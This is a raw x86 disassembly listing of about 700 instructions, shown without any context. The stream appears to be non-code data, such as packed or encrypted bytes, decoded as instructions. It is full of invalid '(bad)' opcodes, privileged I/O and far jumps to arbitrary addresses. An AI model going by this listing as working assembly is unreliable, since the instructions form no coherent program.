  41d7db:	add    eax,0x45df12e1
  41d7e0:	xor    eax,0x5d43ad10
  41d7e5:	xchg   BYTE PTR [ebx-0x12],bl
  41d7e8:	jae    0x41d826
  41d7ea:	aad    0xb5
  41d7ec:	cld    
  41d7ed:	rcl    DWORD PTR [edi+0x61],0x49
  41d7f1:	pop    edi
  41d7f2:	xchg   BYTE PTR [ecx+ebp*8+0xbbbcbbb],bl
  41d7f9:	mov    al,ds:0xfcf9e3c
  41d7fe:	xchg   BYTE PTR [ecx+0x751a00b9],bh
  41d804:	ins    BYTE PTR es:[edi],dx
  41d805:	(bad)  
  41d806:	push   cs
  41d807:	cmc    
  41d808:	fcomp  DWORD PTR [edx-0x65403ab2]
  41d80e:	inc    ebx
  41d80f:	add    al,0x9d
  41d811:	xchg   ebx,eax
  41d812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d813:	mov    BYTE PTR [edi+0x5aae8b5e],dh
  41d819:	faddp  st(2),st
  41d81b:	ins    BYTE PTR es:[edi],dx
  41d81c:	jmp    0x18a93447
  41d821:	arpl   WORD PTR [ebx],di
  41d823:	sub    esi,DWORD PTR [ebp+0x33]
  41d826:	pop    ds
  41d827:	jg     0x41d89e
  41d829:	sub    al,0x3e
  41d82b:	xor    bl,BYTE PTR [ecx]
  41d82d:	in     eax,0x82
  41d82f:	adc    ebp,esi
  41d831:	pop    es
  41d832:	inc    ebp
  41d833:	adc    BYTE PTR [edi],al
  41d835:	sbb    eax,0xf0d20265
  41d83a:	cmp    edi,edx
  41d83c:	sbb    BYTE PTR [ebx+eax*8-0xea17e51],bh
  41d843:	mov    ds:0x8fa48a35,al
  41d848:	ror    BYTE PTR [ecx+edx*4-0x7e],0x5b
  41d84d:	call   0x63f001c7
  41d852:	xor    dl,dl
  41d854:	gs and al,0x23
  41d857:	dec    eax
  41d858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d859:	and    BYTE PTR [esi],dh
  41d85b:	pop    edx
  41d85c:	mov    gs,WORD PTR [edx+0x2f1091fc]
  41d862:	sub    DWORD PTR [edx-0x568f32e8],esp
  41d868:	in     al,dx
  41d869:	cs out 0x98,al
  41d86c:	ror    bl,0x80
  41d86f:	cs out 0xaf,al
  41d872:	mov    ds:0xfa9ae12e,eax
  41d877:	aas    
  41d878:	adc    DWORD PTR ds:0x3c8713fb,ebx
  41d87e:	mov    esi,0xf0d32ab6
  41d883:	pop    edx
  41d884:	mov    bl,0x48
  41d886:	lds    ebp,FWORD PTR [ebp+0x63]
  41d889:	ins    DWORD PTR es:[edi],dx
  41d88a:	inc    edi
  41d88b:	lea    ecx,fs:[edx+ebp*8]
  41d88f:	adc    edx,DWORD PTR [edi]
  41d891:	inc    ebp
  41d892:	sbb    eax,0x658955e7
  41d897:	out    0x79,eax
  41d899:	push   ebp
  41d89a:	mov    eax,0x703e94
  41d89f:	lahf   
  41d8a0:	jg     0x41d8d8
  41d8a2:	sub    DWORD PTR [edi-0x704d1db7],ebp
  41d8a8:	inc    esp
  41d8a9:	cmp    dh,dh
  41d8ab:	adc    dh,BYTE PTR [ecx+0x94d2ccf]
  41d8b1:	ds es icebp 
  41d8b4:	mov    dh,BYTE PTR [ebx-0x3f724e61]
  41d8ba:	enter  0xe14c,0x6a
  41d8be:	xor    dl,BYTE PTR [ebx]
  41d8c0:	push   esp
  41d8c1:	sub    eax,0xb2638f23
  41d8c6:	les    esp,FWORD PTR [esi-0x1f]
  41d8c9:	ja     0x41d8eb
  41d8cb:	cmp    eax,0xa65e3a5d
  41d8d0:	ret    0xf8ed
  41d8d3:	dec    ebx
  41d8d4:	jp     0x41d89a
  41d8d6:	adc    al,0x18
  41d8d8:	and    dh,BYTE PTR [ebx]
  41d8da:	cs cmp al,0xaa
  41d8dd:	mov    ecx,0x181a0447
  41d8e2:	iret   
  41d8e3:	les    edx,FWORD PTR [esi]
  41d8e5:	fdivrp st(2),st
  41d8e7:	movd   mm2,DWORD PTR [eax-0x6d]
  41d8eb:	push   ebx
  41d8ec:	ins    BYTE PTR es:[edi],dx
  41d8ed:	sub    edx,ebp
  41d8ef:	(bad)  
  41d8f0:	jmp    0x346d:0x8ad70c4b
  41d8f7:	inc    edx
  41d8f8:	fwait
  41d8f9:	bound  esp,QWORD PTR [edx+0x2104569b]
  41d8ff:	adc    BYTE PTR [ecx-0x8],al
  41d902:	push   ds
  41d903:	push   edi
  41d904:	push   ecx
  41d905:	fstp   QWORD PTR [esi]
  41d907:	lods   al,BYTE PTR ds:[esi]
  41d908:	es dec ebp
  41d90a:	call   0x34d4078e
  41d90f:	sub    ah,BYTE PTR [edx-0x65]
  41d912:	ror    BYTE PTR [edx-0x4f],cl
  41d915:	int    0xd1
  41d917:	cmp    al,0x47
  41d919:	jecxz  0x41d968
  41d91b:	fild   QWORD PTR [eax-0x303ede37]
  41d921:	mov    dl,0xc
  41d923:	pop    es
  41d924:	not    DWORD PTR [edi-0x22]
  41d927:	adc    BYTE PTR [esi-0x1f],ch
  41d92a:	xchg   edi,eax
  41d92b:	xchg   ecx,eax
  41d92c:	xor    eax,0xe8a205f9
  41d931:	jle    0x41d955
  41d933:	les    edi,FWORD PTR [eax+0x36]
  41d936:	jecxz  0x41d9b0
  41d938:	imul   ebp,ebp,0x6cbc6ebe
  41d93e:	sub    al,0xc1
  41d940:	out    0x96,al
  41d942:	sbb    eax,0x4d20ba92
  41d947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d948:	sar    DWORD PTR [edi-0x74],cl
  41d94b:	int3   
  41d94c:	pop    es
  41d94d:	movzx  edi,cx
  41d950:	xchg   edx,eax
  41d951:	ror    cl,0x66
  41d954:	call   0xd7e3:0xf500e145
  41d95b:	pop    edx
  41d95c:	or     ebx,ebx
  41d95e:	addr16 test al,0x39
  41d961:	rcl    DWORD PTR [eax],1
  41d963:	sub    edx,DWORD PTR [ecx-0x7e803bdb]
  41d969:	mov    ch,0xeb
  41d96b:	pop    ecx
  41d96c:	dec    eax
  41d96d:	hlt    
  41d96e:	inc    esi
  41d96f:	jecxz  0x41d9cb
  41d971:	push   ss
  41d972:	jns    0x41d9ec
  41d974:	icebp  
  41d975:	sub    eax,DWORD PTR [edi]
  41d977:	int3   
  41d978:	(bad)  
  41d979:	pop    ecx
  41d97a:	xor    esp,ebp
  41d97c:	push   ecx
  41d97d:	jp     0x41d98c
  41d97f:	fcomip st,st(0)
  41d981:	xchg   esi,eax
  41d982:	dec    eax
  41d983:	fs popf 
  41d985:	sti    
  41d986:	loopne 0x41d9d1
  41d988:	dec    esi
  41d989:	lds    esi,FWORD PTR [ebx+0x674784d7]
  41d98f:	mov    edx,gs
  41d991:	data16 mov ah,0x54
  41d994:	imul   esi,DWORD PTR [ecx],0xffffffff
  41d997:	ja     0x41d947
  41d999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d99a:	mov    eax,ds:0x72653bb
  41d99f:	sbb    BYTE PTR [eax-0x45acf9b0],bl
  41d9a5:	xor    eax,0xb6028a28
  41d9aa:	jmp    0x2730:0xc47d7ac6
  41d9b1:	adc    BYTE PTR [edi*4-0x4d462877],ch
  41d9b8:	test   bl,cl
  41d9ba:	mov    WORD PTR [ebx+0x78],?
  41d9bd:	mov    al,ds:0x1a4860c7
  41d9c2:	fild   QWORD PTR [edi+esi*8+0x1aa1890]
  41d9c9:	or     BYTE PTR ds:0xf7d21a13,dl
  41d9cf:	adc    BYTE PTR [edx],cl
  41d9d1:	ret    
  41d9d2:	rcl    BYTE PTR ds:0x4c7b20dc,cl
  41d9d8:	inc    esp
  41d9d9:	mov    cl,al
  41d9db:	daa    
  41d9dc:	adc    eax,0xb1278382
  41d9e1:	jmp    0x987d82b2
  41d9e6:	(bad)  
  41d9e7:	add    DWORD PTR [edi-0x4e],0xd3034e21
  41d9ee:	test   BYTE PTR [ebx],bh
  41d9f0:	pop    esi
  41d9f1:	inc    edi
  41d9f2:	(bad)  [esp+ecx*1]
  41d9f5:	mov    ch,0x79
  41d9f7:	push   esp
  41d9f8:	cmp    esp,DWORD PTR [edi+0x27]
  41d9fb:	xor    esp,ebp
  41d9fd:	adc    al,0xcb
  41d9ff:	dec    ebp
  41da00:	stos   DWORD PTR es:[edi],eax
  41da01:	or     edx,DWORD PTR [ebx-0x3b8db2d1]
  41da07:	mov    bh,BYTE PTR [eax]
  41da09:	sbb    esi,DWORD PTR [ebx-0x64]
  41da0c:	mov    DWORD PTR [edi-0x22eeb50b],edi
  41da12:	cli    
  41da13:	ja     0x41d9be
  41da15:	add    DWORD PTR [ebp-0x67],edx
  41da18:	gs ret 0x7429
  41da1c:	scas   al,BYTE PTR es:[edi]
  41da1d:	arpl   ax,si
  41da1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da20:	(bad)  
  41da21:	push   ecx
  41da22:	addr16 int 0x3
  41da25:	adc    edx,DWORD PTR [ebx-0x4d]
  41da28:	ja     0x41da41
  41da2a:	sub    esp,eax
  41da2c:	stos   BYTE PTR es:[edi],al
  41da2d:	rcl    DWORD PTR [esi+0x44],0xf0
  41da31:	and    DWORD PTR [esi-0x628c335c],esp
  41da37:	push   ss
  41da38:	out    dx,al
  41da39:	lock cmp DWORD PTR [esi-0x5e2dfe5c],esi
  41da40:	xchg   edx,eax
  41da41:	pop    ebp
  41da42:	push   ebx
  41da43:	pop    eax
  41da44:	pop    eax
  41da45:	xchg   edi,eax
  41da46:	test   al,0x6b
  41da48:	cmp    DWORD PTR [edx+0x69],esp
  41da4b:	aam    0x1e
  41da4d:	add    al,0x73
  41da4f:	pop    edi
  41da50:	mov    bl,0xaf
  41da52:	mov    dl,0xd1
  41da54:	inc    ebp
  41da55:	test   DWORD PTR [esp],esp
  41da58:	cli    
  41da59:	add    DWORD PTR [esi-0x2a3a495b],ebx
  41da5f:	sub    al,0xd
  41da61:	es cli 
  41da63:	dec    ebx
  41da64:	fcomp  QWORD PTR [edi+0x5a]
  41da67:	jg     0x41da0c
  41da69:	addr16 iret 
  41da6b:	or     edx,DWORD PTR [edx+esi*4]
  41da6e:	cmp    al,0x1e
  41da70:	mov    ebx,0xfb8a82b4
  41da75:	out    0x71,al
  41da77:	push   ecx
  41da78:	ins    DWORD PTR es:[edi],dx
  41da79:	jb     0x41dab9
  41da7b:	stos   DWORD PTR es:[edi],eax
  41da7c:	inc    ebx
  41da7d:	pop    ebx
  41da7e:	mov    al,ds:0x9e8304b9
  41da83:	xor    dh,BYTE PTR [edx-0x22]
  41da86:	or     BYTE PTR [esi+0x7e],bl
  41da89:	adc    al,0xd6
  41da8b:	ss js  0x41da19
  41da8e:	push   ss
  41da8f:	adc    DWORD PTR [ebp+0x4baa05e1],ebx
  41da95:	mov    cl,BYTE PTR [edi+0x6f265beb]
  41da9b:	and    cl,BYTE PTR es:[eax-0x3675dc22]
  41daa2:	sbb    bh,BYTE PTR [edx+ecx*1]
  41daa5:	cmp    eax,0xda5c2af6
  41daaa:	int    0xf4
  41daac:	in     al,0xad
  41daae:	stos   DWORD PTR es:[edi],eax
  41daaf:	stos   BYTE PTR es:[edi],al
  41dab0:	imul   ebp,DWORD PTR [eax],0xffffffc8
  41dab3:	mov    DWORD PTR [esi-0x64cca5e],esi
  41dab9:	mov    ?,WORD PTR [ebx]
  41dabb:	fidivr WORD PTR [edi-0x5c3ad042]
  41dac1:	mov    esp,0x805a1484
  41dac6:	mov    ebx,0x26a10fa9
  41dacb:	bound  esp,QWORD PTR [ebx-0x71]
  41dace:	mov    ah,0xf5
  41dad0:	push   ebx
  41dad1:	ss iret 
  41dad3:	ds inc eax
  41dad5:	xor    dl,BYTE PTR [ecx]
  41dad7:	lods   eax,DWORD PTR ds:[esi]
  41dad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dad9:	std    
  41dada:	sub    bl,BYTE PTR [esi-0x1d1e4853]
  41dae0:	lods   eax,DWORD PTR ds:[esi]
  41dae1:	push   cs
  41dae2:	repnz sar BYTE PTR [edi],cl
  41dae5:	pop    edi
  41dae6:	push   esi
  41dae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daea:	add    esi,DWORD PTR [ecx+0x696b704d]
  41daf0:	mov    al,0x70
  41daf2:	lods   al,BYTE PTR ds:[esi]
  41daf3:	scas   al,BYTE PTR es:[edi]
  41daf4:	sbb    al,0x5e
  41daf6:	push   ebx
  41daf7:	sub    esp,edx
  41daf9:	pop    ebp
  41dafa:	fdivr  QWORD PTR [ecx]
  41dafc:	call   0xe194:0x8c0b0560
  41db03:	cli    
  41db04:	out    0x99,eax
  41db06:	pop    esp
  41db07:	mov    al,ds:0x6bc72a2e
  41db0c:	rcr    DWORD PTR [edx+edx*4],cl
  41db0f:	aas    
  41db10:	aad    0x7a
  41db12:	push   esi
  41db13:	inc    esi
  41db14:	mov    dl,0x55
  41db16:	push   esp
  41db17:	jmp    0x41daf2
  41db19:	leave  
  41db1a:	shl    bh,0x6c
  41db1d:	adc    ch,BYTE PTR [eax-0x52]
  41db20:	shl    ecx,0xf5
  41db23:	loope  0x41db77
  41db25:	fst    QWORD PTR [esi+0x79d22a4]
  41db2b:	push   0xd0fa20b4
  41db30:	add    BYTE PTR [ebx+0x11],bh
  41db33:	fidiv  DWORD PTR [eax+0x267f835e]
  41db39:	int3   
  41db3a:	cwde   
  41db3b:	sbb    al,0x81
  41db3d:	inc    ebp
  41db3e:	cmp    ah,BYTE PTR [ebx]
  41db40:	stos   DWORD PTR es:[edi],eax
  41db41:	addr16 retf 0xdaf8
  41db45:	outs   dx,BYTE PTR ds:[esi]
  41db46:	dec    ecx
  41db47:	es jbe 0x41daf7
  41db4a:	popa   
  41db4b:	cli    
  41db4c:	sti    
  41db4d:	jbe    0x41db5d
  41db4f:	sti    
  41db50:	push   0xffffffdf
  41db52:	ja     0x41db24
  41db54:	or     eax,0x80825bb2
  41db59:	mov    ebp,0x178d1ba7
  41db5e:	(bad)  
  41db5f:	adc    DWORD PTR [esi-0x761d6219],esi
  41db65:	push   edi
  41db66:	mul    DWORD PTR [edx-0x50]
  41db69:	out    dx,eax
  41db6a:	imul   ebp,DWORD PTR [ebx-0x762d3280],0xffffff94
  41db71:	leave  
  41db72:	cmp    DWORD PTR [edx-0x12],esi
  41db75:	pop    ecx
  41db76:	(bad)  
  41db77:	dec    ebp
  41db78:	loopne 0x41db45
  41db7a:	fdivrp st(6),st
  41db7c:	xor    ah,dl
  41db7e:	aad    0x33
  41db80:	pop    edi
  41db81:	test   BYTE PTR [ebx+edx*1-0xa],cl
  41db85:	cld    
  41db86:	daa    
  41db87:	mov    WORD PTR [ebx-0x369ab1b2],fs
  41db8d:	aaa    
  41db8e:	shl    BYTE PTR [edi+ebx*4-0x4d80368a],cl
  41db95:	sbb    ecx,DWORD PTR [eax]
  41db97:	mov    DWORD PTR [eax+edx*2+0x43],edx
  41db9b:	or     edi,DWORD PTR [eax-0x3b3d3b70]
  41dba1:	cmp    BYTE PTR [esi+0x24],cl
  41dba4:	ins    DWORD PTR es:[edi],dx
  41dba5:	test   BYTE PTR [ebx+eax*8+0x613acc9a],0x95
  41dbad:	cmp    esp,DWORD PTR es:[ebx+0x20b274d2]
  41dbb4:	dec    ebx
  41dbb5:	test   eax,0x85644a90
  41dbba:	sbb    BYTE PTR [ebx+0xf],al
  41dbbd:	rcr    BYTE PTR [ebp-0xd],0x58
  41dbc1:	mov    ds:0xa38334c6,al
  41dbc6:	mov    bl,dh
  41dbc8:	loopne 0x41db9e
  41dbca:	jae    0x41dbed
  41dbcc:	popf   
  41dbcd:	add    BYTE PTR [ecx],0x56
  41dbd0:	dec    esp
  41dbd1:	and    eax,0xfcd68fbd
  41dbd6:	loop   0x41dbe0
  41dbd8:	(bad)  
  41dbd9:	popf   
  41dbda:	lods   eax,DWORD PTR ds:[esi]
  41dbdb:	sti    
  41dbdc:	jno    0x41db9a
  41dbde:	aas    
  41dbdf:	lea    ebp,[edx+0x35]
  41dbe2:	xor    ebp,ebx
  41dbe4:	dec    ebp
  41dbe5:	pop    esp
  41dbe6:	cmc    
  41dbe7:	test   eax,0xfad9a14e
  41dbec:	xchg   ebp,eax
  41dbed:	loopne 0x41dc30
  41dbef:	mov    dh,0x6
  41dbf1:	shr    BYTE PTR [eax-0x1d],1
  41dbf4:	shr    BYTE PTR [esi+0x210b93fd],0x1b
  41dbfb:	scas   eax,DWORD PTR es:[edi]
  41dbfc:	lods   al,BYTE PTR ds:[esi]
  41dbfd:	std    
  41dbfe:	pop    esp
  41dbff:	push   edx
  41dc00:	or     al,0x5c
  41dc02:	std    
  41dc03:	xor    DWORD PTR [edx+edx*8+0x59],edx
  41dc07:	and    dh,dh
  41dc09:	dec    ecx
  41dc0a:	sub    BYTE PTR [esi-0x10aef544],0x96
  41dc11:	(bad)  
  41dc12:	inc    esp
  41dc13:	gs xchg ecx,eax
  41dc15:	das    
  41dc16:	or     eax,0xee9645a1
  41dc1b:	jmp    0xd2b4fa5e
  41dc20:	stos   BYTE PTR es:[edi],al
  41dc21:	inc    ebp
  41dc22:	dec    ebp
  41dc23:	das    
  41dc24:	test   al,0x2f
  41dc26:	mov    bl,0xc2
  41dc28:	(bad)  
  41dc29:	xchg   edx,eax
  41dc2a:	or     esp,DWORD PTR [ebp+0x2c]
  41dc2d:	in     eax,0x10
  41dc2f:	inc    edi
  41dc30:	jo     0x41dbf3
  41dc32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc33:	sti    
  41dc34:	adc    al,0x6a
  41dc36:	nop
  41dc37:	stc    
  41dc38:	test   BYTE PTR [edi+0x73],0x39
  41dc3c:	js     0x41dc1c
  41dc3e:	std    
  41dc3f:	call   0x2aa:0x4f79b7f6
  41dc46:	jecxz  0x41dc19
  41dc48:	push   ebx
  41dc49:	mov    ch,0x7c
  41dc4b:	(bad)  cs:[edx+0x3300eba6]
  41dc52:	jmp    0xa37:0xf10eb9c1
  41dc59:	in     eax,dx
  41dc5a:	cld    
  41dc5b:	mov    dl,0x61
  41dc5d:	sub    eax,ecx
  41dc5f:	(bad)  ds:0xe254f5b
  41dc65:	test   ecx,0x97e688b6
  41dc6b:	imul   ebp,DWORD PTR [edi-0x5235f4ef],0xffffffc3
  41dc72:	icebp  
  41dc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc74:	(bad)  
  41dc75:	dec    ebx
  41dc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc77:	imul   edi,DWORD PTR fs:[ecx+0x6734337],0x5145dada
  41dc82:	pop    ebx
  41dc83:	xchg   BYTE PTR [ebp+ebx*4+0x61],bl
  41dc87:	mov    BYTE PTR [esi-0x3ddab96a],dh
  41dc8d:	mov    ah,0x23
  41dc8f:	repnz (bad) 
  41dc91:	cwde   
  41dc92:	ds xchg esi,eax
  41dc94:	lods   al,BYTE PTR ds:[esi]
  41dc95:	cdq    
  41dc96:	leave  
  41dc97:	or     BYTE PTR [esi+ebx*1],dl
  41dc9a:	les    esp,FWORD PTR [ecx+0x3f]
  41dc9d:	mov    ds:0x258e2567,al
  41dca2:	fs shl bh,cl
  41dca5:	lahf   
  41dca6:	pop    ecx
  41dca7:	cmc    
  41dca8:	inc    esi
  41dca9:	jbe    0x41dcb0
  41dcab:	fdiv   st(1),st
  41dcad:	neg    DWORD PTR [ecx-0x1b3f8673]
  41dcb3:	fmulp  st(4),st
  41dcb5:	push   ebx
  41dcb6:	(bad)  
  41dcb7:	mov    ecx,0x68454e5e
  41dcbc:	out    dx,al
  41dcbd:	das    
  41dcbe:	cmp    BYTE PTR [ebp-0x1bc30905],bh
  41dcc4:	push   cs
  41dcc5:	and    BYTE PTR [esi+0x23385fd4],ah
  41dccb:	loopne 0x41dca5
  41dccd:	sbb    al,0x1f
  41dccf:	sbb    DWORD PTR [esi+0x40b3bc10],ebp
  41dcd5:	ror    BYTE PTR [eax+0x46032201],0x6
  41dcdc:	mov    ds:0xbb714a9c,al
  41dce1:	shl    BYTE PTR [ebp+0x7dfaff6d],0x66
  41dce8:	rol    BYTE PTR [ebx-0x60dbb636],cl
  41dcee:	outs   dx,DWORD PTR ds:[esi]
  41dcef:	les    edi,FWORD PTR [esi]
  41dcf1:	clc    
  41dcf2:	dec    ebp
  41dcf3:	fstp   QWORD PTR [ebp+0x1f887c71]
  41dcf9:	sahf   
  41dcfa:	stc    
  41dcfb:	jmp    0x41dcc2
  41dcfd:	mov    eax,0xe70ed10f
  41dd02:	or     BYTE PTR [ecx+0x33],dh
  41dd05:	sub    al,0x2f
  41dd07:	je     0x41dd5a
  41dd09:	xchg   ebp,eax
  41dd0a:	fdiv   QWORD PTR [ebx]
  41dd0c:	push   ebp
  41dd0d:	sbb    eax,0x953a6bd
  41dd12:	out    0xb5,eax
  41dd14:	and    eax,ebp
  41dd16:	stos   DWORD PTR es:[edi],eax
  41dd17:	adc    BYTE PTR [edx-0x5c763f11],0x85
  41dd1e:	ror    BYTE PTR [edi+0x4c],1
  41dd21:	loop   0x41dd87
  41dd23:	mov    bh,BYTE PTR [esi-0x2f7e1658]
  41dd29:	fistp  DWORD PTR [ecx+0x1254731b]
  41dd2f:	test   eax,0x8ac1e54
  41dd34:	pushf  
  41dd35:	out    dx,eax
  41dd36:	pop    ss
  41dd37:	jmp    0x3ad19731
  41dd3c:	mov    dl,0xc3
  41dd3e:	pushf  
  41dd3f:	(bad)  
  41dd42:	push   bx
  41dd44:	ret    
  41dd45:	mov    ah,0xe2
  41dd47:	xor    dl,dl
  41dd49:	cs pusha 
  41dd4b:	fdivr  DWORD PTR [ecx]
  41dd4d:	sti    
  41dd4e:	in     eax,dx
  41dd4f:	add    BYTE PTR [ebx-0x7f],ah
  41dd52:	out    dx,al
  41dd53:	push   cs
  41dd54:	cld    
  41dd55:	xchg   cl,bl
  41dd57:	imul   eax,DWORD PTR [edi-0x7d],0xffffffe2
  41dd5b:	out    0xa7,al
  41dd5d:	aam    0xca
  41dd5f:	push   esp
  41dd60:	test   al,0x70
  41dd62:	or     al,BYTE PTR [eax-0x37414d2d]
  41dd68:	mul    al
  41dd6a:	inc    eax
  41dd6b:	popa   
  41dd6c:	push   cs
  41dd6d:	mov    al,0x60
  41dd6f:	inc    eax
  41dd70:	jmp    0x9ff5:0x6817b654
  41dd77:	cs jmp 0x802b6955
  41dd7d:	jl     0x41dd24
  41dd7f:	push   es
  41dd80:	mov    esi,0x9f9be5b4
  41dd85:	int    0x2f
  41dd87:	fnsave [edi-0x64]
  41dd8a:	mov    esp,0xa50e7cff
  41dd8f:	push   ds
  41dd90:	inc    esi
  41dd91:	mov    ecx,0xc6d2394d
  41dd96:	loopne 0x41dd45
  41dd98:	fidiv  DWORD PTR [ecx+0x59f20205]
  41dd9e:	sub    al,0xe4
  41dda0:	push   edx
  41dda1:	pop    ds
  41dda2:	jne    0x41dde7
  41dda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda5:	pusha  
  41dda6:	pop    eax
  41dda7:	into   
  41dda8:	pop    ebp
  41dda9:	call   0x81a8:0x9b9d1769
  41ddb0:	aad    0x3e
  41ddb2:	sub    BYTE PTR [edx+0x142d3f97],al
  41ddb8:	rcr    DWORD PTR [esi-0x48],cl
  41ddbb:	add    BYTE PTR [edi-0x11],ah
  41ddbe:	mov    edx,0x450ab279
  41ddc3:	ss or  eax,0x3b28038d
  41ddc9:	or     BYTE PTR [ebx-0x6],dl
  41ddcc:	cwde   
  41ddcd:	inc    esi
  41ddce:	sbb    BYTE PTR [edx-0x2b],cl
  41ddd1:	scas   eax,DWORD PTR es:[edi]
  41ddd2:	cmp    eax,0x40d5913a
  41ddd7:	mov    gs,WORD PTR [ecx+ebp*8-0xf]
  41dddb:	push   ecx
  41dddc:	inc    edx
  41dddd:	add    ebp,DWORD PTR [eax+0x20]
  41dde0:	add    eax,0xd813bee9
  41dde5:	or     bl,0xf6
  41dde8:	jno    0x41de3d
  41ddea:	push   ss
  41ddeb:	add    ecx,DWORD PTR [edx+0x55]
  41ddee:	adc    dh,BYTE PTR [edi]
  41ddf0:	test   al,0xfd
  41ddf2:	xor    eax,DWORD PTR [ecx-0x4c]
  41ddf5:	jmp    0x53d38a4f
  41ddfa:	jmp    0x2475:0xc17ab7ea
  41de01:	add    al,0x29
  41de03:	outs   dx,BYTE PTR ds:[esi]
  41de04:	loop   0x41de72
  41de06:	add    ebx,0xcc57a69f
  41de0c:	sub    cl,BYTE PTR [edi]
  41de0e:	push   ecx
  41de0f:	ja     0x41ddac
  41de11:	adc    eax,ebx
  41de13:	mov    cl,0xa2
  41de15:	imul   esi,DWORD PTR [edi-0x3],0x4e022ae2
  41de1c:	pusha  
  41de1d:	shr    BYTE PTR [edi-0x3e],1
  41de20:	test   DWORD PTR [ecx],esp
  41de22:	sub    bh,BYTE PTR [edi+0x57ae33f5]
  41de28:	xchg   BYTE PTR [edx+ebx*1-0x10],dl
  41de2c:	jecxz  0x41de0d
  41de2e:	mov    ebp,DWORD PTR [eax+0x7]
  41de31:	jne    0x41ddff
  41de33:	repz jne 0x41dea7
  41de36:	push   ds
  41de37:	mov    dl,0xcc
  41de39:	mov    ebp,DWORD PTR [edi]
  41de3b:	inc    esp
  41de3c:	addr16 mov al,ah
  41de3f:	sub    eax,ebp
  41de41:	outs   dx,BYTE PTR ds:[esi]
  41de42:	dec    esi
  41de43:	scas   al,BYTE PTR es:[edi]
  41de44:	aad    0xf9
  41de46:	stos   DWORD PTR es:[edi],eax
  41de47:	(bad)  
  41de48:	jbe    0x41de1b
  41de4a:	out    0x9f,al
  41de4c:	or     eax,0xe273cec2
  41de51:	inc    esi
  41de52:	sbb    al,0x70
  41de54:	mov    bl,0xc6
  41de56:	test   al,0x6a
  41de58:	mov    eax,0x1c9f6d91
  41de5d:	rcr    BYTE PTR [esi+ebp*2],cl
  41de60:	(bad)  
  41de61:	jl     0x41de0e
  41de63:	scas   eax,DWORD PTR es:[edi]
  41de64:	jmp    FWORD PTR [edi-0x6b]
  41de67:	mov    dh,0x1e
  41de69:	adc    eax,0xcf465771
  41de6e:	loop   0x41de9b
  41de70:	sti    
  41de71:	mov    BYTE PTR [esi-0x6d],dh
  41de74:	(bad)  
  41de75:	out    dx,eax
  41de76:	or     al,0xa7
  41de78:	jge    0x41deb3
  41de7a:	cdq    
  41de7b:	(bad)  
  41de7c:	adc    dl,BYTE PTR [ebx*2+0x6b82a818]
  41de83:	xchg   esi,eax
  41de84:	(bad)  
  41de85:	ja     0x41dead
  41de87:	lahf   
  41de88:	cld    
  41de89:	xor    bl,BYTE PTR [edx+ebp*4+0x1d4ed546]
  41de90:	push   0xec19acbf
  41de95:	sub    dh,cl
  41de97:	xlat   BYTE PTR ds:[ebx]
  41de98:	bound  ebp,QWORD PTR [ebp-0x7237617b]
  41de9e:	scas   al,BYTE PTR es:[edi]
  41de9f:	pop    ebx
  41dea0:	xor    ch,BYTE PTR [esi+0x12]
  41dea3:	xchg   ebp,eax
  41dea4:	sahf   
  41dea5:	mov    esp,0xda3d570a
  41deaa:	jecxz  0x41de9a
  41deac:	xchg   edi,eax
  41dead:	mov    edx,0xed1374d
  41deb2:	call   0x87d6826b
  41deb7:	je     0x41df01
  41deb9:	dec    ebp
  41deba:	mov    dh,0xab
  41debc:	cmp    bh,BYTE PTR [edi-0x4d]
  41debf:	cmp    ebp,DWORD PTR [esi]
  41dec1:	pxor   mm6,mm3
  41dec4:	bound  esi,QWORD PTR [ebx]
  41dec6:	adc    edx,DWORD PTR [ebx+0x163d3b9e]
  41decc:	mov    ebx,0xdc111920
  41ded1:	rcl    ah,cl
  41ded3:	push   ss
  41ded4:	sahf   
  41ded5:	mov    cs,WORD PTR [ecx+0x15]
  41ded8:	xchg   ebx,eax
  41ded9:	adc    eax,0x82e29b9d
  41dede:	pop    DWORD PTR ds:0xa5d8d650
  41dee4:	push   ecx
  41dee5:	bound  esi,QWORD PTR [esi+0x76]
  41dee8:	aad    0xf6
  41deea:	sbb    eax,0x2f991f94
  41deef:	aas    
  41def0:	je     0x41df41
  41def2:	pushf  
  41def3:	push   ebx
  41def4:	adc    eax,0xf7932648
  41def9:	push   esp
  41defa:	(bad)  
  41defc:	cmc    
  41defd:	mov    al,0xab
  41deff:	mov    bh,0x14
  41df01:	jo     0x41dece
  41df03:	scas   al,BYTE PTR es:[edi]
  41df04:	jns    0x41df36
  41df06:	and    ebp,DWORD PTR [edx]
  41df08:	xchg   esp,eax
  41df09:	rol    DWORD PTR [ecx+edi*1-0x1d],cl
  41df0d:	jle    0x41decf
  41df0f:	test   ebx,esp
  41df11:	in     al,0x4f
  41df13:	rol    bl,1
  41df15:	xchg   ebp,eax
  41df16:	lahf   
  41df17:	cmc    
  41df18:	out    0x18,eax
  41df1a:	xchg   eax,ebp
  41df1c:	jnp    0x41df8c
  41df1e:	inc    edi
  41df1f:	push   ss
  41df20:	push   ss
  41df21:	imul   ebp,esp,0xf8de3306
  41df27:	cld    
  41df28:	add    DWORD PTR [ebp+0x11],ecx
  41df2b:	cmp    DWORD PTR [ecx+eiz*2],esi
  41df2e:	or     esi,DWORD PTR [ebp+eax*4+0x5b]
  41df32:	fnstenv cs:[eax-0x4a]
  41df36:	sbb    DWORD PTR [eax],0xa34c2a9e
  41df3c:	shl    DWORD PTR [ebx],0x7e
  41df3f:	addr16 push ebx
  41df41:	cs jb  0x41df24
  41df44:	fist   DWORD PTR [esi]
  41df46:	test   DWORD PTR [ebx-0x41],ebx
  41df49:	outs   dx,BYTE PTR ds:[esi]
  41df4a:	lea    esi,[edi]
